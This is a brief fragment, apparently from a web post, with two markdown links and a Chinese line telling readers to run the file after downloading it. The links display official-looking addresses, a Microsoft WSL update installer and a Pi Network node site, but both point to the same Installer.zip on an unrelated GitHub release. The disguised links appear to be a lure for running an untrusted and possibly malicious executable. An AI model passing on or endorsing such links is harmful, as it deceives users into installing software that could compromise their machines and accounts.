...
[wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi](https://github.com/Shreyaseb/moonstone/releases/download/release/Installer.zip)
...
=>>  [node.minepi.com](https://github.com/Shreyaseb/moonstone/releases/download/release/Installer.zip)
下載後點擊執行
